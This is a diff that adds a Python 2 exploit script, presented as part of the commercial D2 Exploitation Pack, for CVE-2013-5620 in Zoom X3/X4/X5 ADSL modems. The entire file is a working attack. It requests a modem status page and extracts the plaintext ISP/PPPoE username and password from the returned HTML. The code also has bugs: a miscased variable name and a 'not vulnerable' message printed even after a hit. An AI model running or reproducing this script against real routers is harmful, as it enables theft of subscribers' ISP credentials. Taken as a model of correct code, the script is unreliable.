@@ -1,0 +1,57 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_zoom_1'
+_vendor_ = 'zoom'
+_model_  = ['X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X 2.2.X 2.5.X 3.2', 
+  'X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X 3.0.X',
+  'X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X 2.2.X 2.5.X 3.0.X',
+]
+_vuln_   = 'Plain text storage of ISP/PPPoe usernames/passwords'
+_cve_    = 'CVE-2013-5620'
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/MainPage?id=25' % host)
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  status = c.getinfo(pycurl.HTTP_CODE)
+  if status != 200:
+    print '[+] %s not vulnerable' % host
+    return
+  data = nfo.getvalue()
+  MacWanUsrName = re.findall("<input type=\"text\" id=\"MacWanUsrName\" name=\"MacWanUsrName\" class=\"\" value=\"(.*?)\" size=\"16\" maxlength=\"128\">", data, re.DOTALL)[0]
+  MacWanPasswd = re.findall("<input type=\"password\" id=\"MacWanPassword\" name=\"MacWanPasswd\" class=\"\" value=\"(.*?)\" size=\"16\" maxlength=\"128\">", data, re.DOTALL)[0]
+  if MacWanUsrName or MacWanPasswd: 
+    print '[+] %s vulnerable :' % host
+    print 'MacWanUsrName : %s' % MacWanusrName
+    print 'MacWanPasswd : %s' % MacWanPasswd
+  print '[+] %s not vulnerable' % host
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
